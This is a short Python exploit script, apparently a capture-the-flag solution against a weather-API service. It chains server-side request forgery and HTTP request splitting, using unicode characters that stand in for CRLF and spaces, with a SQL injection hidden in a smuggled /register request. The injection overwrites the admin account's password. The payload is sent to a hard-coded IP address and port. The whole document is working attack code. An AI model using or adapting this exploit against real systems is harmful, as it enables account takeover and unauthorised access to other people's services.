import requests

username = 'admin'
password = "') ON CONFLICT (username) DO UPDATE SET password = 'passwd123';--"

username = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")

endpoint = "127.0.0.1/" + "\u0120" + "HTTP/1.1" + "\u010D\u010A"  +  "Host:" + "\u0120"\
    + "127.0.0.1" + "\u010D\u010A" + "\u010D\u010A" + "POST" + "\u0120" + "/register" +\
    "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120" + "127.0.0.1" + "\u010D\u010A"\
    + "Content-Type:" + "\u0120" + "application/x-www-form-urlencoded" + "\u010D\u010A" + \
    "Content-Length:" + "\u0120" + str(len(username) + len(password) + 19) + \
    "\u010D\u010A" + "\u010D\u010A" + "username=" + username + "&password=" + password\
    + "\u010D\u010A" + "\u010D\u010A" + "GET" + "\u0120"

requests.post('http://206.189.118.55:31790/api/weather', json={'endpoint': endpoint, 'city': 'Tbilisi', 'country': 'GE'},  headers={'Connection':'close'})
